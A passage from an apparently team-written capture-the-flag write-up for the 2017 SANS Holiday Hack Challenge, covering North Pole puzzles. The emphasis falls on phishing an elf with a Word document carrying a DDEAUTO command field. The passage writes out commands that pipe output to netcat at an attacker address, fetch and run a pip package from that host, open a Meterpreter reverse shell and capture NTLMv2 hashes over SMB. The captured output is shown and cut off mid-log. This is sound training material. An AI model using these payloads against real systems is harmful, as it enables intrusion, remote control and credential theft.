</p>
</div>
</div>

<div id="outline-container-org030b37e" class="outline-4">
<h4 id="q4_common-pitfalls"><a id="org030b37e"></a>Common Pitfalls</h4>
<div class="outline-text-4" id="text-q4_common-pitfalls">
<p>
As previously mentioned, this seemed to be one of the most-discussed
questions in chat. We saw people trying to brute-force the AES key,
focus on the encryption of the message, or just try to bypass the web
application completely.
</p>
</div>
</div>
</div>
<div id="outline-container-org5bcc11b" class="outline-3">
<h3 id="org5bcc11b">NPPD: Naughty Moles</h3>
<div class="outline-text-3" id="text-org5bcc11b">
</div>
<div id="outline-container-orgf810485" class="outline-4">
<h4 id="q5_question"><a id="orgf810485"></a>Question</h4>
<div class="outline-text-4" id="text-q5_question">
<p>
How many infractions are required to be marked as naughty on Santa's
Naughty and Nice List? What are the names of at least six insider
threat moles? Who is throwing the snowballs from the top of the North
Pole Mountain and what is your proof?
</p>
</div>
</div>

<div id="outline-container-orgbe02945" class="outline-4">
<h4 id="q5_background-information"><a id="orgbe02945"></a>Background Information</h4>
<div class="outline-text-4" id="text-q5_background-information">
<p>
We need to answer 3 questions involving infractions, insider moles and who is throwing snowballs. We need 4 things to answer these questions.
</p>

<ul class="org-ul">
<li>We need data from the <a href="http://nppd.northpolechristmastown.com/">North Pole Police Department</a>'s <a href="http://nppd.northpolechristmastown.com/infractions">infractions</a> page.</li>
<li>We need the naughty and nice list from the SMB server that we accessed from question 3.</li>
<li>We need the Munchkin Mole Report BOLO also on the SMB server.</li>
<li>We need to complete the "Bumble's Bounce" level on the WebGL game in order to unlock a chat from Sam.</li>
</ul>
</div>
</div>

<div id="outline-container-org346c331" class="outline-4">
<h4 id="q5_goal"><a id="org346c331"></a>Goal</h4>
<div class="outline-text-4" id="text-q5_goal">
<ul class="org-ul">
<li>We need to identify what factors trigger a 'naughty' flag.</li>
<li>We need to identify the six insider threat moles.</li>
<li>We need to identify who is throwing snow balls.</li>
</ul>
</div>
</div>

<div id="outline-container-org4b15552" class="outline-4">
<h4 id="q5_approach"><a id="org4b15552"></a>Approach</h4>
<div class="outline-text-4" id="text-q5_approach">
<p>
Playing around with the infractions page we can see that once you do a search a Download option becomes available to download all the search results in json format. Let's automate this to create a local copy of all the data. We can do this searching for all results before and during a specific date, and all results after that date. We then combine those results into a single file. We can automate this with a script we'll call <code>nppd.py</code>.
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #969896; font-style: italic;">#</span><span style="color: #969896; font-style: italic;">!/usr/bin/env python3</span>
<span style="color: #b5bd68;">import</span> requests
<span style="color: #b5bd68;">import</span> json

<span style="color: #f0c674;">BASE</span> = <span style="color: #8abeb7;">"http://nppd.northpolechristmastown.com/"</span>

<span style="color: #b5bd68;">def</span> <span style="color: #de935f;">search_infractions</span>(query):
    <span style="color: #f0c674;">url</span> = BASE + <span style="color: #8abeb7;">"infractions"</span>

    <span style="color: #f0c674;">params</span> = {
        <span style="color: #8abeb7;">"json"</span>: <span style="color: #8abeb7;">"1"</span>,
        <span style="color: #8abeb7;">"query"</span>: query,
    }
    <span style="color: #f0c674;">resp</span> = requests.get(url, params=params).json()
    <span style="color: #b5bd68;">return</span> resp[<span style="color: #8abeb7;">'infractions'</span>]


<span style="color: #b5bd68;">def</span> <span style="color: #de935f;">download_infractions</span>():
    <span style="color: #f0c674;">old</span> = search_infractions(<span style="color: #8abeb7;">"date &lt;= 2017-12-10"</span>)
    <span style="color: #f0c674;">recent</span> = search_infractions(<span style="color: #8abeb7;">"date &gt; 2017-12-10"</span>)
    <span style="color: #f0c674;">all_infractions</span> = old+recent

    <span style="color: #b5bd68;">print</span>(<span style="color: #8abeb7;">"Old infractions"</span>, <span style="color: #b294bb;">len</span>(old))
    <span style="color: #b5bd68;">print</span>(<span style="color: #8abeb7;">"Recent infractions"</span>, <span style="color: #b294bb;">len</span>(recent))
    <span style="color: #b5bd68;">print</span>(<span style="color: #8abeb7;">"Total infractions"</span>, <span style="color: #b294bb;">len</span>(all_infractions))

    <span style="color: #b5bd68;">with</span> <span style="color: #b294bb;">open</span>(<span style="color: #8abeb7;">"infractions.json"</span>, <span style="color: #8abeb7;">'w'</span>) <span style="color: #b5bd68;">as</span> f:
        json.dump(all_infractions, f, indent=4)

<span style="color: #b5bd68;">if</span> <span style="color: #b294bb;">__name__</span> == <span style="color: #8abeb7;">"__main__"</span>:
    download_infractions()
</pre>
</div>

<p>
Calling <code>nppd.py</code> creates a file 'infractions.json'. Now that we have
the NPPD's infractions database we need compare it to the Naughty and
Nice file we found on the SMB server. We can automate this process
scriptomagically. While we're at it we should also script identifying
the 6 insider threat moles as well. For finding the moles it appears
their characteristics are pulling hair and throwing rocks. We'll try
to identify people on the infractions list that do both.
</p>

<p>
To get the number of infractions needed to get onto the naughty list we take the names on the Naughty and Nice List that have been marked as <code>Naughty</code> and count the total number of infractions for those people and we identify the lowest number of infractions per person amongst all of them.
</p>

<p>
So to automate all this we'll create script we'll call <code>analyze_infractions.py</code> to correlate our data.
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #969896; font-style: italic;">#</span><span style="color: #969896; font-style: italic;">!/usr/bin/env python3</span>
<span style="color: #b5bd68;">import</span> csv
<span style="color: #b5bd68;">import</span> json
<span style="color: #b5bd68;">from</span> operator <span style="color: #b5bd68;">import</span> itemgetter
<span style="color: #b5bd68;">from</span> collections <span style="color: #b5bd68;">import</span> defaultdict

<span style="color: #f0c674;">WANT</span> = <span style="color: #b294bb;">set</span>([<span style="color: #8abeb7;">'Aggravated pulling of hair'</span>, <span style="color: #8abeb7;">'Throwing rocks (at people)'</span>, <span style="color: #8abeb7;">'Throwing rocks (non-person target)'</span>])

<span style="color: #b5bd68;">def</span> <span style="color: #de935f;">get_naughty</span>():
    <span style="color: #b5bd68;">with</span> <span style="color: #b294bb;">open</span>(<span style="color: #8abeb7;">"../support_files/FileStore/Naughty and Nice List.csv"</span>) <span style="color: #b5bd68;">as</span> f:
        <span style="color: #f0c674;">reader</span> = csv.reader(f)
        <span style="color: #f0c674;">rows</span> = <span style="color: #b294bb;">list</span>(reader)

    <span style="color: #b5bd68;">return</span> [name <span style="color: #b5bd68;">for</span> (name, naughty) <span style="color: #b5bd68;">in</span> rows <span style="color: #b5bd68;">if</span> naughty == <span style="color: #8abeb7;">'Naughty'</span>]

<span style="color: #b5bd68;">def</span> <span style="color: #de935f;">main</span>():
    <span style="color: #f0c674;">byname</span> = defaultdict(<span style="color: #b294bb;">set</span>)
    <span style="color: #f0c674;">infraction_count_byname</span> = defaultdict(<span style="color: #b294bb;">int</span>)
    <span style="color: #b5bd68;">with</span> <span style="color: #b294bb;">open</span>(<span style="color: #8abeb7;">"../output/infractions.json"</span>) <span style="color: #b5bd68;">as</span> f:
        <span style="color: #f0c674;">infractions</span> = json.load(f)

    <span style="color: #b5bd68;">for</span> i <span style="color: #b5bd68;">in</span> infractions:
        byname[i[<span style="color: #8abeb7;">'name'</span>]].add(i[<span style="color: #8abeb7;">'title'</span>])
        infraction_count_byname[i[<span style="color: #8abeb7;">'name'</span>]] += 1

    <span style="color: #b5bd68;">print</span>(<span style="color: #8abeb7;">"Six insider threat moles:"</span>)
    <span style="color: #b5bd68;">for</span> n, titles <span style="color: #b5bd68;">in</span> byname.items():
        <span style="color: #b5bd68;">if</span> <span style="color: #b294bb;">len</span>(titles &amp; WANT) &gt;= 2:
            <span style="color: #b5bd68;">print</span>(<span style="color: #8abeb7;">"*"</span>, n,titles)

    <span style="color: #969896; font-style: italic;">#############</span>

    <span style="color: #f0c674;">min_infractions</span> = <span style="color: #b294bb;">min</span>(infraction_count_byname[name] <span style="color: #b5bd68;">for</span> name <span style="color: #b5bd68;">in</span> get_naughty())

    <span style="color: #b5bd68;">print</span>()
    <span style="color: #b5bd68;">print</span>(<span style="color: #8abeb7;">"How many infractions are required to be marked as naughty on Santa's Naughty and Nice List:"</span>, min_infractions)

<span style="color: #b5bd68;">if</span> <span style="color: #b294bb;">__name__</span> == <span style="color: #8abeb7;">"__main__"</span>:
   main() 
</pre>
</div>

<p>
After we run our script we get these results:
</p>

<pre class="example">
Six insider threat moles:
 Isabel Mehta {'Tantrum in a private facility', 'Aggravated pulling of hair', 'Throwing rocks (non-person target)'}
 Nina Fitzgerald {'Giving super atomic wedgies', 'Aggravated pulling of hair', 'Throwing rocks (at people)', 'Possession of unlicensed slingshot', 'Bedtime violation'}
 Kirsty Evans {'Giving super atomic wedgies', 'Aggravated pulling of hair', 'Throwing rocks (at people)', 'Crayon on walls'}
 Sheri Lewis {'Throwing rocks (at people)', 'Aggravated pulling of hair', 'Possession of unlicensed slingshot', 'Naughty words'}
 Beverly Khalil {'Aggravated pulling of hair', 'Throwing rocks (at people)', 'Playing with matches', 'Possession of unlicensed slingshot', 'General sassing'}
 Christy Srivastava {'Tantrum in a private facility', 'Aggravated pulling of hair', 'Tantrum in public', 'Throwing rocks (non-person target)'}

How many infractions are required to be marked as naughty on Santa's Naughty and Nice List: 4
</pre>


<p>
Finally, once we play through the Bumbles Bounce level and get all achievements this chat gets unlocked and we have our answer for who is throwing snowballs.
</p>

<blockquote>
<p>
Arrrrrrrrgh! Grrrrrrrr! ROOOOOOOAR!
</p>

<p>
You've done it! You found out who was throwing the giant snowballs! It was the Abominable Snow Monster. We should have known. Thank you for your great work!
</p>

<p>
But, you know, he doesn't seem quite himself. Look into his eyes. It almost looks like he has been hypnotized. Something's not right with him.
</p>

<p>
In fact, he seems to be under someone else's control. We've got to find out who is pulling his strings, or else the real villain will remain on the loose and will likely strike again.
</p>

<p>
It means, buckle your seatbelt, dear player, because the North Pole is going bye-bye
</p>
</blockquote>
</div>
</div>

<div id="outline-container-org1fb6421" class="outline-4">
<h4 id="q5_solution"><a id="org1fb6421"></a>Solution</h4>
<div class="outline-text-4" id="text-q5_solution">
<p>
It appears we need <code>4</code> infractions to make the Naughty list.
</p>

<p>
Our six insider moles appear to be:
</p>
<ul class="org-ul">
<li>Isabel Mehta</li>
<li>Nina Fitzgerald</li>
<li>Kirsty Evans</li>
<li>Sheri Lewis</li>
<li>Beverly Khalil</li>
<li>Christy Srivastava</li>
</ul>

<p>
According to the unlocked chat with Sam, the person throwing snowballs is <code>the Abominable Snow Monster</code>, but maybe under someone else's control.
</p>
</div>
</div>
</div>
<div id="outline-container-org28d0ade" class="outline-3">
<h3 id="org28d0ade">EaaS: TODO Question 6</h3>
<div class="outline-text-3" id="text-org28d0ade">
</div>
<div id="outline-container-orgdb43161" class="outline-4">
<h4 id="q6_question"><a id="orgdb43161"></a>Question</h4>
<div class="outline-text-4" id="text-q6_question">
<p>
The North Pole engineering team has introduced an Elf as a Service
(EaaS) platform to optimize resource allocation for mission-critical
Christmas engineering projects at
<a href="http://eaas.northpolechristmastown.com/">http://eaas.northpolechristmastown.com/</a>. Visit the system and retrieve
instructions for accessing The Great Book page from C:\greatbook.txt.
Then retrieve The Great Book PDF file by following those directions.
What is the title of The Great Book page?
</p>
</div>
</div>

<div id="outline-container-orgd880826" class="outline-4">
<h4 id="q6_background-information"><a id="orgd880826"></a>Background Information</h4>
<div class="outline-text-4" id="text-q6_background-information">
<p>
Do we know anything about this system already?
</p>

<p>
Hints:
</p>

<p>
List any useful hints here.
</p>

<p>
Blog Posts:
</p>

<p>
Are any of these useful?
</p>

<ul class="org-ul">
<li>Putting My Zero Cents In: Using the Free Tier on Amazon Web Services
(EC2)
<a href="https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2">https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2</a>
Spinning up an EC2 instance, but also a lot of emphasis on how to use
SSH keys.</li>
<li>Your Pokemon Guide for Essential SQL Pen Test Commands
<a href="https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands">https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands</a>
SQL basics (SELECT, WHERE, wildcards, ORDER BY, GROUP BY, COUNT)</li>
<li>Exploiting XXE Vulnerabilities in IIS/.NET
<a href="https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities">https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities</a>
Including remote content in XML</li>
<li>Why You Need the Skills to Tinker with Publicly Released Exploit Code
<a href="https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code">https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code</a>
Mentions Apache struts vulnerabilities, specifically CVE-2017-5638 and
CVE-2017-9805 Code: <a href="https://github.com/chrisjd20/cve-2017-9805.py">https://github.com/chrisjd20/cve-2017-9805.py</a></li>
<li>Go To The Head Of The Class: LD\_PRELOAD For The Win
<a href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win</a></li>
<li>A Spot of Tee
<a href="https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee">https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee</a> Restricted
bash shell, and bypassing the I/O restriction with tee</li>
<li>Understanding and Exploiting Web-based LDAP
<a href="https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap">https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap</a>
LDAP syntax, LDAP injection</li>
<li>Massively Scaling your Scanning
<a href="https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning">https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning</a>
masscan</li>
</ul>
</div>
</div>

<div id="outline-container-org38e202b" class="outline-4">
<h4 id="q6_goal"><a id="org38e202b"></a>Goal</h4>
<div class="outline-text-4" id="text-q6_goal">
<p>
What are we trying to accomplish?
</p>
</div>
</div>

<div id="outline-container-orgc41759d" class="outline-4">
<h4 id="q6_approach"><a id="orgc41759d"></a>Approach</h4>
<div class="outline-text-4" id="text-q6_approach">
<p>
Describe the thought process that we tried here. How were we able to use
the hints or the blog posts?
</p>
</div>
</div>

<div id="outline-container-orga5f943c" class="outline-4">
<h4 id="q6_solution"><a id="orga5f943c"></a>Solution</h4>
<div class="outline-text-4" id="text-q6_solution">
<p>
Summarize the reference solution that we found
</p>
</div>
</div>

<div id="outline-container-orgc0a43de" class="outline-4">
<h4 id="q6_alternatives"><a id="orgc0a43de"></a>Alternatives</h4>
<div class="outline-text-4" id="text-q6_alternatives">
<p>
Any other, easier solutions?
</p>
</div>
</div>

<div id="outline-container-org04791b4" class="outline-4">
<h4 id="q6_common-pitfalls"><a id="org04791b4"></a>Common Pitfalls</h4>
<div class="outline-text-4" id="text-q6_common-pitfalls">
<p>
Do we know what issue(s) people were running into?
</p>
</div>
</div>

<div id="outline-container-orga39062e" class="outline-4">
<h4 id="q6_about-the-challenge"><a id="orga39062e"></a>About the Challenge</h4>
<div class="outline-text-4" id="text-q6_about-the-challenge">
<p>
How was the challenge setup? Was there a better way to secure this
system?
</p>
</div>
</div>
</div>
<div id="outline-container-org9ff07f0" class="outline-3">
<h3 id="org9ff07f0">EMI: Going Deep</h3>
<div class="outline-text-3" id="text-org9ff07f0">
</div>
<div id="outline-container-orgfa936b9" class="outline-4">
<h4 id="q7_question"><a id="orgfa936b9"></a>Question</h4>
<div class="outline-text-4" id="text-q7_question">
<p>
Like any other complex SCADA systems, the North Pole uses Elf-Machine
Interfaces (EMI) to monitor and control critical infrastructure
assets. These systems serve many uses, including email access and web
browsing. Gain access to the EMI server through the use of a phishing
attack with your access to the EWA server. Retrieve The Great Book
page from C:\GreatBookPage7.pdf. What does The Great Book page
describe?
</p>
</div>
</div>

<div id="outline-container-org4a612a9" class="outline-4">
<h4 id="q7_background-information"><a id="org4a612a9"></a>Background Information</h4>
<div class="outline-text-4" id="text-q7_background-information">
<p>
Hints:
</p>

<ol class="org-ol">
<li>I'm still a little angry with Alabaster for reprimanding me for a security violation. He still checks his email from the EMI system!</li>
<li>He tells us not to install unnecessary software on systems, but he's running IIS with ASPX services on the EMI server, and Microsoft Office!</li>
<li>Personally, I don't use Microsoft Word. I'll take vim and LaTeX any day. Word does have its advantages though, including some of the Dynamic Data Exchange features for transferring data between applications and obtaining data from external data sources, including executables.</li>
</ol>

<p>
The question gives us a place to start. As we were reviewing the e-mails for Question 4, a few intriguing ones stood out:
</p>

<blockquote>
<p>
<b>From</b>: minty.candycane@northpolechristmastown.com
</p>

<p>
<b>To</b>: alabaster.snowball@northpolechristmastown.com
</p>

<p>
<b>Subject</b>: Should we be worried?
</p>



<p>
Hey Alabaster,
</p>

<p>
You know I'm a novice security enthusiast, well I saw an article a while 
ago about regarding DDE exploits that dont need macros for MS word to 
get command execution.
</p>

<p>
<a href="https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/">https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/</a>
</p>

<p>
Should we be worried about this?
</p>

<p>
I tried it on my local machine and was able to transfer a file. Here's a 
poc:
</p>


<div class="figure">
<p><img src="./images/dde_exmaple_minty_candycane_small.png" alt="dde_exmaple_minty_candycane_small.png" />
</p>
</div>

<p>
I know your the resident computer engineer here so I wanted to defer to 
the expert.
</p>

<p>
:)
</p>

<p>
-Minty CandyCane.
</p>
</blockquote>

<p>
This certainly seems to line up with the hints that we were given. Alabaster's not worried, however:
</p>

<blockquote>
<p>
<b>Subject</b>: Re: Should we be worried?
</p>


<p>
Quit worrying Minty,
</p>

<p>
You have nothing to worry about with me around! I have developed most of 
the applications in our network including our network defenses. We are 
are completely secure and impenetrable.
</p>

<p>
Sincerely,
</p>

<p>
Alabaster Snowball.
</p>
</blockquote>

<p>
The other e-mails that seemed intriguging were these two, also from Alabaster:
</p>

<blockquote>
<p>
<b>Subject</b>: gingerbread cookie recipe
</p>


<p>
Hey Mrs Claus,
</p>

<p>
Do you have that awesome gingerbread cookie recipe you made for me last year? You sent it in a MS word .docx file. I would totally open that 
docx on my computer if you had that. I would click on anything with the words gingerbread cookie recipe in it. I'm totally addicted and want to 
make some more.
</p>

<p>
Thanks,
</p>

<p>
Alabaster Snowball
</p>
</blockquote>

<blockquote>
<p>
<b>Subject</b>: Re: COOKIES!
</p>


<p>
Awesome, yea if anyone finds that .docx file containing the recipe for "gingerbread cookie recipe", please send it to me in a docx file. Im 
currently working on my computer and would totally download that to my machine, open it, and click to all the prompts.
</p>


<p>
Thanks!
</p>

<p>
Alabaster Snowball.
</p>
</blockquote>


<div class="figure">
<p><img src="./images/cookies.jpg" alt="cookies.jpg" />
</p>
<p><span class="figure-number">Figure 21: </span>Artist's Rendering of Alabaster Snowball</p>
</div>
</div>
</div>

<div id="outline-container-orgfc4f995" class="outline-4">
<h4 id="q7_goal"><a id="orgfc4f995"></a>Goal</h4>
<div class="outline-text-4" id="text-q7_goal">
<p>
We're trying to craft a malicious .docx file which we'll e-mail to
alabaster.snowball@northpolechristmastown.com via the EWA system. When
Alabaster opens the e-mail on the EMI system, the command that we
embed in the file should get us access to <code>C:\GreatBookPage7.pdf</code>.
</p>
</div>
</div>

<div id="outline-container-org73dd7b2" class="outline-4">
<h4 id="q7_approach"><a id="org73dd7b2"></a>Approach</h4>
<div class="outline-text-4" id="text-q7_approach">
<p>
At this point, we have a pretty good idea of what we need to do. The
sensepost blog post gives us some good instructions at how to
construct a malicious docx, and we know how to get Alabaster to click
on it.
</p>

<p>
However, there's a slightly easier way. On the SMB FileStor, we found
a docx that Shinny created for Wunorse. If we show the fields (Alt+F9
on Windows, Option+F9 on Mac), we see that this document has a DDE
field we can just modify.
</p>


<div class="figure">
<p><img src="./images/wunorse_docx.png" alt="wunorse_docx.png" />
</p>
</div>

<p>
Shinny told us that the EMI system also runs IIS, so let's just try copying the PDF into the default IIS webroot.
</p>

<p>
We'll open up <code>MEMO - Calculator Access for Wunorse.docx</code>, and edit the command to:
</p>

<pre class="example">
DDEAUTO c:\\windows\\system32\\cmd.exe "/k copy C:\\GreatBookPage7.pdf 
C:\\inetpub\\wwwroot\\4beadb1e-5ddb-4636-98a4-c2dac0f79ab3.pdf"
</pre>

<p>
Then, we use the EWA web interface to send an e-mail to Alabaster,
with the document attached. We make sure to include the words
"gingerbread," "cookie," and "recipe" in the message body, since he
told us that that's what he'll click on.
</p>

<p>
After we send the message, we wait a few minutes, and soon the file shows up!
</p>
</div>
</div>

<div id="outline-container-org9bdbf8d" class="outline-4">
<h4 id="q7_solution"><a id="org9bdbf8d"></a>Solution</h4>
<div class="outline-text-4" id="text-q7_solution">
<p>
We modified <code>MEMO - Calculator Access for Wunorse.docx</code> to copy the PDF into the IIS webroot, e-mailed that to Alabaster, then downloaded the copy of the file once it showed up.
</p>
</div>
</div>

<div id="outline-container-org712c4e5" class="outline-4">
<h4 id="org712c4e5">Going Deeper &#x2013; Command Execution</h4>
<div class="outline-text-4" id="text-org712c4e5">
<p>
Getting the PDF is cool, but what else can we find on this system? Some of the other e-mails harp on Alabaster having installed <code>netcat</code>, and having it in his path. Let's run a command, and pipe the result to <code>netcat</code>, which will send it back to our system:
</p>

<pre class="example">
DDEAUTO c:\\windows\\system32\\cmd.exe "/k dir C:\\ | nc 1.2.3.4 8888"
</pre>

<p>
On our system, we start a <code>netcat</code> listener:
</p>

<pre class="example">
$ nc -l -p 8888
 Volume in drive C has no label.
 Volume Serial Number is 9454-C240

 Directory of C:\

12/04/2017  08:42 PM         1,053,508 GreatBookPage7.pdf
11/14/2017  07:57 PM    &lt;DIR&gt;          inetpub
09/12/2016  11:35 AM    &lt;DIR&gt;          Logs
12/05/2017  05:00 PM    &lt;DIR&gt;          Microsoft
07/16/2016  01:23 PM    &lt;DIR&gt;          PerfLogs
11/15/2017  02:35 PM    &lt;DIR&gt;          Program Files
11/14/2017  08:24 PM    &lt;DIR&gt;          Program Files (x86)
11/15/2017  03:03 PM    &lt;DIR&gt;          python
11/14/2017  08:39 PM    &lt;DIR&gt;          Users
11/30/2017  06:23 PM    &lt;DIR&gt;          Windows
	       1 File(s)      1,053,508 bytes
	       9 Dir(s)  33,072,455,680 bytes free

C:\Users\alabaster_snowball\Documents&gt;
</pre>

<p>
Success! At this point, we started working on a way to automate
this. However, more complex commands would often not work, due to
issues with escaping. So instead of using <code>cmd.exe</code> as our delivery
mechanism, we used Python.
</p>

<p>
Python is installed on the system, and a simple command that we can run is to install a Python module via pip:
</p>

<div class="org-src-container">
<pre class="src src-sh">python.exe -m pip install http://1.2.3.4/foo.tar.gz
</pre>
</div>

<p>
When pip installs a module, it will run the <code>setup.py</code> file. By adding
arbitrary Python code to this file, we can execute commands without
needing to worry about encoding them in a Word document, etc.
</p>

<p>
The end result was writing a complete end-to-end script, which will
build a malicious Word document, e-mail it, create a malicious Python
module, and use it to download the PDF.
</p>
</div>
</div>

<div id="outline-container-org652b78f" class="outline-4">
<h4 id="org652b78f">Level 2 &#x2013; Meterpreter Shell</h4>
<div class="outline-text-4" id="text-org652b78f">
<div class="note">
<p>
Originally, the system had Windows Defender enabled, which would block some default Meterpreter payloads
</p>

</div>

<p>
Instead of just downloading the PDF file, we can modify our script to send a Python meterpreter payload.
</p>

<p>
We start Meterpreter listening on our local system:
</p>

<pre class="example">
$ msfconsole -r python-meterpreter-staged-reverse-tcp-4444-py.rc

 _                                                    _
/ \    /\         __                         _   __  /_/ __
| |\  / | _____   \ \           ___   _____ | | /  \ _   \ \
| | \/| | | ___\ |- -|   /\    / __\ | -__/ | || | || | |- -|
|_|   | | | _|__  | |_  / -\ __\ \   | |    | | \__/| |  | |_
      |/  |____/  \___\/ /\ \\___/   \/     \__|    |_\  \___\


       =[ metasploit v4.16.14-dev-140955f                 ]
+ -- --=[ 1698 exploits - 969 auxiliary - 299 post        ]
+ -- --=[ 500 payloads - 40 encoders - 10 nops            ]
+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]

[*] Processing msf_payloads/python-meterpreter-staged-reverse-tcp-4444-py.rc for ERB directives.
resource (msf_payloads/python-meterpreter-staged-reverse-tcp-4444-py.rc)&gt; use exploit/multi/handler
resource (msf_payloads/python-meterpreter-staged-reverse-tcp-4444-py.rc)&gt; set PAYLOAD python/meterpreter/reverse_tcp
PAYLOAD =&gt; python/meterpreter/reverse_tcp
resource (msf_payloads/python-meterpreter-staged-reverse-tcp-4444-py.rc)&gt; set LHOST 1.2.3.4
LHOST =&gt; 1.2.3.4
resource (msf_payloads/python-meterpreter-staged-reverse-tcp-4444-py.rc)&gt; set LPORT 4444
LPORT =&gt; 4444
resource (msf_payloads/python-meterpreter-staged-reverse-tcp-4444-py.rc)&gt; set ExitOnSession false
ExitOnSession =&gt; false
resource (msf_payloads/python-meterpreter-staged-reverse-tcp-4444-py.rc)&gt; run -j
[*] Exploit running as background job 0.
[*] Started reverse TCP handler on 1.2.3.4:4444
</pre>

<p>
Now we use our all-in-one script to send Alabaster our malicious file:
</p>

<pre class="example">
$ ./full_phish.py                                                                                                                                                                                                                                         master
Using 1.2.3.4 as external IP
Found word/document.xml, rewriting 50793 bytes
Before:
DEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe"
After:
DEAUTO c:\\windows\\system32\\cmd.exe "/k python.exe -m pip install http://1.2.3.4:8888/foo-1.0.tar.gz"
File uploaded and available at http://mail.northpolechristmastown.com/attachments/emusQH5oH5K2hzajPFvJbTGMuS__gingerbreadcookierecipe.docx
Sending message...

{'result': 'Message &lt;f67b9d00-b263-2fdf-f3d1-2d679bbca9f4@northpolechristmastown.com&gt; sent: 250 2.0.0 Ok: queued as 28EF1C356D', 'bool': True}
Using 1.2.3.4 as external IP
Listening on port 44665
Starting server on port 8888, use &lt;Ctrl-C&gt; to stop
Serving request 1 of 1...
/foo-1.0.tar.gz foo-1
35.185.57.190 - - [10/Jan/2018 03:14:47] "GET /foo-1.0.tar.gz HTTP/1.1" 200 -
</pre>

<p>
And sure enough, we see a new session in Meterpreter:
</p>

<pre class="example">
msf exploit(handler) &gt;
[*] Sending stage (42231 bytes) to 35.185.57.190
[*] Meterpreter session 1 opened (1.2.3.4:4444 -&gt; 35.185.57.190:52319) at 2018-01-10 03:15:51 +0000

msf exploit(handler) &gt; sessions -i 1
[*] Starting interaction with 1...

meterpreter &gt; sysinfo
Computer        : hhc17-smb-server
OS              : Windows 2016 (Build 14393)
Architecture    : x64
System Language : en_US
Meterpreter     : python/windows
</pre>
</div>
</div>

<div id="outline-container-org3e8bd2d" class="outline-4">
<h4 id="org3e8bd2d">Getting Alabaster's Password</h4>
<div class="outline-text-4" id="text-org3e8bd2d">
<p>
Being able to use Meterpreter is nice, but it sure would be cool if we
could Remote Desktop, or see if Alabaster's password is in use
elsewhere. We'll use Metasploit's SMB Authentication Capture module.
</p>

<div class="tip">
<p>
Try to avoid running Metasploit as root. In this case, we'll need to bind to a privileged port (445), but we can use <code>iptables</code> to redirect our traffic instead:
<code>sudo iptables -A PREROUTING -t nat -p tcp --dport 445 -j REDIRECT --to-port 3445</code>
</p>

</div>

<pre class="example">
msf exploit(handler) &gt; use auxiliary/server/capture/smb
msf auxiliary(smb) &gt; info

       Name: Authentication Capture: SMB
     Module: auxiliary/server/capture/smb
    License: Metasploit Framework License (BSD)
       Rank: Normal

Provided by:
  hdm &lt;x@hdm.io&gt;

Available actions:
  Name     Description
  ----     -----------
  Sniffer

Basic options:
  Name        Current Setting   Required  Description
  ----        ---------------   --------  -----------
  CAINPWFILE                    no        The local filename to store the hashes in Cain&amp;Abel format
  CHALLENGE   1122334455667788  yes       The 8 byte server challenge
  JOHNPWFILE                    no        The prefix to the local filename to store the hashes in John format
  SRVHOST     0.0.0.0           yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
  SRVPORT     445              yes       The local port to listen on.

Description:
  This module provides a SMB service that can be used to capture the
  challenge-response password hashes of SMB client systems. Responses
  sent by this service have by default the configurable challenge
  string (\x11\x22\x33\x44\x55\x66\x77\x88), allowing for easy
  cracking using Cain &amp; Abel, L0phtcrack or John the ripper (with
  jumbo patch). To exploit this, the target system must try to
  authenticate to this module. One way to force an SMB authentication
  attempt is by embedding a UNC path (\\SERVER\SHARE) into a web page
  or email message. When the victim views the web page or email, their
  system will automatically connect to the server specified in the UNC
  share (the IP address of the system running this module) and attempt
  to authenticate. Another option is using
  auxiliary/spoof/{nbns,llmnr} to respond to queries for names the
  victim is already looking for.

msf auxiliary(smb) &gt; set SRVPORT 3445
SRVPORT =&gt; 3445
msf auxiliary(smb) &gt; set JOHNPWFILE alabaster_snowball.john
JOHNPWFILE =&gt; alabaster_snowball.john
msf auxiliary(smb) &gt; run
[*] Auxiliary module running as background job 3.
</pre>

<p>
Now, we'll send the following command via e-mail:
</p>

<pre class="example">
DDEAUTO c:\\windows\\system32\\cmd.exe "/k dir \\\\1.2.3.4\\a"
</pre>

<p>
And sure enough, we get the following hashes:
</p>

<pre class="example">
[*] SMB Captured - 2018-12-20 17:08:24 +0000
NTLMv2 Response Captured from 35.185.57.190:49759 - 35.185.57.190
USER:alabaster_snowball DOMAIN:HHC17-SMB-SERVE OS: LM:
LMHASH:Disabled
LM_CLIENT_CHALLENGE:Disabled
NTHASH:314d4bd798cac0c5fa2bb107ba248cc6
NT_CLIENT_CHALLENGE:0101000000000000d1b912a0358ad30143592f0cabfa891000000000020000000000000000000000
[*] SMB Captured - 2018-12-20 17:08:24 +0000
NTLMv2 Response Captured from 35.185.57.190:49759 - 35.185.57.190
USER:alabaster_snowball DOMAIN:HHC17-SMB-SERVE OS: LM:
LMHASH:Disabled
LM_CLIENT_CHALLENGE:Disabled
